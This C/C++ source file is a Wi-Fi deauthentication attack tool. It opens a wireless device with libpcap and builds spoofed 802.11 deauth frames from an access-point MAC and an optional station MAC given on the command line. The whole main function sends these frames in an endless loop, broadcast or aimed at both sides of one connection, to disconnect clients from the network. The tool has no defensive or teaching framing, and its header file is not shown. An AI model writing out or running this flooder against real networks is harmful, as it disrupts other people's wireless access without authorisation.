#include <Deauth-attack.h>

int main(int argc, char* argv[])
{
    if(argc < 3 || argc > 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    struct deauth apacket, spacket;
    apacket.radio.it_version=version;
    apacket.radio.it_pad=pad;
    apacket.radio.it_len=len;
    apacket.radio.it_present=pre;
    apacket.dth.type=dea;
    apacket.dth.duration=dur;
    apacket.dth.dmac=Mac("FF:FF:FF:FF:FF:FF");
    apacket.dth.smac=Mac(argv[2]);
    apacket.dth.bssid=Mac(argv[2]);
    apacket.dth.num=seq;
    apacket.wm.reason_code=code;

    if(argv[3]!=0) {
        spacket.radio.it_version=version;
        spacket.radio.it_pad=pad;
        spacket.radio.it_len=len;
        spacket.radio.it_present=pre;
        spacket.dth.type=dea;
        spacket.dth.duration=dur;
        spacket.dth.num=seq;
        spacket.wm.reason_code=code;
        apacket.dth.dmac=Mac(argv[3]);
        apacket.dth.smac=Mac(argv[2]);
        apacket.dth.bssid=Mac(argv[2]);
        spacket.dth.dmac=Mac(argv[2]);
        spacket.dth.smac=Mac(argv[3]);
        spacket.dth.bssid=Mac(argv[3]);
    }

    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&apacket), sizeof(deauth));
        if(argv[3]!=0) {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spacket), sizeof(deauth));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        usleep(1);
    }
}
